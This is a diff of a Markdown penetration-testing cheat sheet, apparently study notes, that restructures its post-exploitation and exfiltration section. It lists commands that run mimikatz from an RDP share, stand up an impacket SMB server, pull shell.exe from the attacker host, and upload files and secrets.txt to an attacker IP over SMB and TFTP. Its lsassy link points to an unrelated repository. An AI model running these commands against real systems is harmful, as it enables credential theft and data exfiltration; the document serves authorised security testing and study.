@@ -284,22 +284,36 @@ ____
      \\tsclient\share\mimikatz\x64\mimikatz.exe   
 
 ____ 
- # Post Exploitation / Exfiltration 
- [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
- [Reference - Exfil Files from Windows Manually](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)  
+# Post Exploitation / Exfiltration  
+## Checklist
+Dual home:
+
+    ipconfig /all
+    arp -a
+    route print 
+## Access
  Enabled WinRm as Administrator to use evil-winrm  
  
      WinRM quickconfig       
+ 
+Enable RDP
+
+
+## Transferring Files
+ [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
+ [Reference - Exfil Files from Windows Manually](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)  
  
      sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                         #only on a trusted network (no password)   
      sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS        
      net use \\IP\share /USER:USER PASS    
      copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
      copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
-## Old Boxes (Windows XP)  
+     
+### Old Boxes (Windows XP)  
 TFTP usually enabled 
 metasploit tfp server module on Kali
-tftp -i 192.168.119.10 PUT secrets.txt
+
+    tftp -i 192.168.119.10 PUT secrets.txt
      
 ## Remote Scripts  
 [lsassy](https://github.com/PowerShellMafia/PowerSploit): script to extract creds remotely using impacket  
